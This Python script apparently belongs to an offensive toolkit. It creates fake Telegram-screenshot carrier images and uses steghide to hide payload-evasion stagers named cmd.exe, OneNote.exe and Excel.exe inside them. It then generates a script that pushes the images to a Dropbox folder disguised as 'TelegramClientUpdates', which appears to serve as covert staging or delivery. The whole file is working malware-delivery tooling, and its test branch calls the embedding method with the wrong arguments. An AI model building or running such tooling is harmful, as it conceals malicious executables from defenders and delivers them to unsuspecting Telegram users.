#!/usr/bin/env python3
"""
Large Image Steganography System
Creates huge images that can hold 2.4MB payloads
Uses real Telegram images as bases
"""

import os
import sys
import time
import hashlib
import subprocess
import random
import json
from pathlib import Path
from PIL import Image, ImageDraw, ImageFont
import numpy as np

class LargeStegoSystem:
    def __init__(self, password="telegram2025research"):
        self.password = password
        self.base_dir = Path(__file__).parent
        self.images_dir = self.base_dir / "large-stego-images"
        self.output_dir = self.base_dir / "stego-output"
        self.telegram_dir = self.base_dir / "telegram-clone/web.telegram.org/img"
        
        # Create directories
        for d in [self.images_dir, self.output_dir]:
            d.mkdir(exist_ok=True)

    def convert_telegram_images(self):
        """Convert Telegram PNG images to large JPEG images"""
        print("Converting Telegram images to large JPEGs...")
        
        # Find all Telegram images
        telegram_images = []
        if self.telegram_dir.exists():
            telegram_images = list(self.telegram_dir.glob("**/*.png"))
        
        converted_count = 0
        
        for img_path in telegram_images:
            try:
                # Load the image
                img = Image.open(img_path)
                
                # Convert to RGB if needed
                if img.mode != 'RGB':
                    img = img.convert('RGB')
                
                # Scale up the image significantly
                scale_factor = 8  # Make it 8x larger
                new_size = (img.width * scale_factor, img.height * scale_factor)
                img_large = img.resize(new_size, Image.LANCZOS)
                
                # Save as high-quality JPEG
                output_name = f"telegram_{img_path.stem}_{converted_count:03d}.jpg"
                output_path = self.images_dir / output_name
                img_large.save(output_path, 'JPEG', quality=98, optimize=False)
                
                file_size = output_path.stat().st_size
                print(f"✓ Converted: {output_name} ({file_size // 1024}KB)")
                converted_count += 1
                
            except Exception as e:
                print(f"✗ Failed to convert {img_path}: {str(e)}")
        
        print(f"Converted {converted_count} Telegram images")

    def create_massive_images(self, count=20):
        """Create massive images that can hold 2.4MB+ payloads"""
        print(f"Creating {count} massive carrier images...")
        
        # For 2.4MB payload, we need images of at least 20MB+ 
        # Using high-quality JPEG
        target_dimensions = [
            (4000, 3000),  # 12MP
            (5000, 4000),  # 20MP  
            (6000, 4000),  # 24MP
            (7000, 5000),  # 35MP
            (8000, 6000),  # 48MP
        ]
        
        for i in range(count):
            width, height = random.choice(target_dimensions)
            
            # Create realistic image content
            img_array = self._create_massive_realistic_image(width, height, i)
            img = Image.fromarray(img_array)
            
            # Add some text overlay to make it look like a screenshot
            self._add_realistic_overlay(img, i)
            
            # Save as maximum quality JPEG
            filename = f"massive_{i:03d}.jpg"
            filepath = self.images_dir / filename
            img.save(filepath, 'JPEG', quality=100, optimize=False)
            
            file_size = filepath.stat().st_size
            print(f"✓ Created: {filename} ({width}x{height}, {file_size // (1024*1024)}MB)")

    def _create_massive_realistic_image(self, width, height, seed):
        """Create massive realistic image - optimized for speed"""
        np.random.seed(seed)
        
        # Create coordinate grids for vectorized operations
        x = np.arange(width)
        y = np.arange(height)
        X, Y = np.meshgrid(x, y)
        
        # Vectorized sine wave patterns
        r = (128 + 64 * np.sin(X * 0.001) * np.cos(Y * 0.0015) + 
             32 * np.sin(X * 0.003) * np.cos(Y * 0.002)).astype(np.uint8)
        g = (128 + 64 * np.cos(X * 0.0012) * np.sin(Y * 0.001) +
             32 * np.cos(X * 0.0025) * np.sin(Y * 0.0018)).astype(np.uint8)
        b = (128 + 64 * np.sin(X * 0.0008) * np.cos(Y * 0.0012) +
             32 * np.sin(X * 0.002) * np.cos(Y * 0.0022)).astype(np.uint8)
        
        # Stack RGB channels
        img = np.stack([r, g, b], axis=-1)
        img = np.clip(img, 0, 255)
        
        # Add structured noise
        noise = np.random.randint(-15, 16, (height, width, 3))
        img = np.clip(img.astype(int) + noise, 0, 255).astype(np.uint8)
        
        # Add geometric patterns more efficiently
        self._add_geometric_patterns_fast(img, width, height, seed)
        
        return img

    def _add_geometric_patterns_fast(self, img, width, height, seed):
        """Add geometric patterns efficiently"""
        np.random.seed(seed)
        
        # Add fewer but larger rectangles for speed
        for _ in range(20):
            x1 = np.random.randint(0, max(1, width - 500))
            y1 = np.random.randint(0, max(1, height - 500))
            x2 = min(width, x1 + np.random.randint(200, 600))
            y2 = min(height, y1 + np.random.randint(100, 400))
            
            color = [np.random.randint(0, 256) for _ in range(3)]
            
            # Draw rectangle
            if x2 > x1 and y2 > y1:
                img[y1:y2, x1:x2] = color

    def _add_geometric_patterns(self, img, width, height, seed):
        """Legacy method - keeping for compatibility"""
        self._add_geometric_patterns_fast(img, width, height, seed)

    def _add_realistic_overlay(self, img, seed):
        """Add text and UI elements to make it look like a screenshot"""
        draw = ImageDraw.Draw(img)
        
        # Try to load a font, fall back to default if not available
        try:
            font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 48)
            small_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 32)
        except:
            font = ImageFont.load_default()
            small_font = ImageFont.load_default()
        
        # Add fake UI elements
        draw.rectangle([50, 50, img.width-50, 150], fill=(240, 240, 240))
        draw.text((100, 80), f"Telegram Desktop - Conversation {seed+1}", fill=(0, 0, 0), font=font)
        
        # Add fake message bubbles
        for i in range(random.randint(3, 8)):
            y_pos = 200 + i * 120
            if y_pos > img.height - 200:
                break
                
            # Message bubble
            bubble_width = random.randint(300, 600)
            draw.rectangle([100, y_pos, 100 + bubble_width, y_pos + 80], 
                          fill=(220, 248, 198))
            draw.text((120, y_pos + 20), f"Message content {i+1} from conversation", 
                     fill=(0, 0, 0), font=small_font)

    def embed_payload(self, payload_path, image_path, output_path):
        """Embed payload using steghide"""
        try:
            cmd = [
                'steghide', 'embed',
                '-cf', str(image_path),
                '-ef', str(payload_path),
                '-sf', str(output_path), 
                '-p', self.password,
                '-z', '9',
                '-e', 'des',
                '-q'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                return True, "Embedded successfully"
            else:
                return False, result.stderr.strip()
        except subprocess.TimeoutExpired:
            return False, "Embedding timeout"
        except Exception as e:
            return False, str(e)

    def process_stagers(self):
        """Process stagers into steganography images"""
        stager_paths = [
            "/home/kali/tools/ScareCrow/cmd.exe",
            "/home/kali/tools/ScareCrow/OneNote.exe", 
            "/home/kali/tools/ScareCrow/Excel.exe"
        ]
        
        print("Processing stagers with large images...")
        
        # Create large images if we don't have enough
        carrier_images = list(self.images_dir.glob("*.jpg"))
        
        if len(carrier_images) < 15:
            print("Creating large carrier images...")
            self.convert_telegram_images()
            self.create_massive_images(20)
            carrier_images = list(self.images_dir.glob("*.jpg"))
        
        # Check sizes
        print("Available carrier images:")
        for img in carrier_images[:5]:
            size = img.stat().st_size
            print(f"  {img.name}: {size // (1024*1024)}MB")
        
        stego_manifest = {}
        
        for stager_path in stager_paths:
            if not os.path.exists(stager_path):
                print(f"Stager not found: {stager_path}")
                continue
                
            stager_size = os.path.getsize(stager_path)
            print(f"\nProcessing {Path(stager_path).name} ({stager_size // 1024}KB)...")
            
            stager_name = Path(stager_path).stem
            stego_manifest[stager_name] = []
            
            success_count = 0
            for j, carrier in enumerate(carrier_images):
                if success_count >= 3:  # Only need 3 successful embeddings per stager
                    break
                    
                carrier_size = carrier.stat().st_size
                
                # Skip images that are too small (need at least 10x the payload size)
                if carrier_size < stager_size * 10:
                    print(f"  Skipping {carrier.name} - too small ({carrier_size // (1024*1024)}MB)")
                    continue
                
                output_name = f"{stager_name}_{j:02d}.jpg"
                output_path = self.output_dir / output_name
                
                print(f"  Embedding into {carrier.name} ({carrier_size // (1024*1024)}MB)...")
                success, message = self.embed_payload(stager_path, carrier, output_path)
                
                if success:
                    with open(output_path, 'rb') as f:
                        file_hash = hashlib.sha256(f.read()).hexdigest()
                    
                    stego_manifest[stager_name].append({
                        'filename': output_name,
                        'carrier': carrier.name,
                        'hash': file_hash,
                        'size': os.path.getsize(output_path)
                    })
                    print(f"  ✓ Success: {output_name}")
                    success_count += 1
                else:
                    print(f"  ✗ Failed: {message}")
        
        # Save manifest
        manifest_path = self.output_dir / "large_stego_manifest.json"
        with open(manifest_path, 'w') as f:
            json.dump(stego_manifest, f, indent=2)
        
        print(f"\nManifest saved to: {manifest_path}")
        return stego_manifest

    def create_dropbox_script(self):
        """Create upload script for Dropbox"""
        script = f'''#!/bin/bash
# Upload large steganography images

DROPBOX_DIR="$HOME/Dropbox/Apps/TelegramClientUpdates/LargeImages"
STEGO_DIR="/home/kali/Cloudflare/stego-output"

mkdir -p "$DROPBOX_DIR"

echo "Uploading large steganography images..."
cp "$STEGO_DIR"/*.jpg "$DROPBOX_DIR"/

echo "Images uploaded successfully!"
ls -lh "$DROPBOX_DIR"/*.jpg
'''
        
        script_path = self.output_dir / "upload_large_images.sh"
        with open(script_path, 'w') as f:
            f.write(script)
        
        os.chmod(script_path, 0o755)
        print(f"Upload script created: {script_path}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 large-stego-system.py [create|process|test]")
        return
    
    stego = LargeStegoSystem()
    command = sys.argv[1]
    
    if command == "create":
        stego.convert_telegram_images()
        stego.create_massive_images(20)
    elif command == "process":
        stego.process_stagers() 
        stego.create_dropbox_script()
    elif command == "test":
        # Test extraction
        stego_images = list(stego.output_dir.glob("*.jpg"))
        if stego_images:
            test_img = stego_images[0]
            test_out = stego.output_dir / "test_extract.exe"
            success, msg = stego.embed_payload(test_img, test_out)
            print(f"Test: {'Success' if success else 'Failed'} - {msg}")

if __name__ == "__main__":
    main()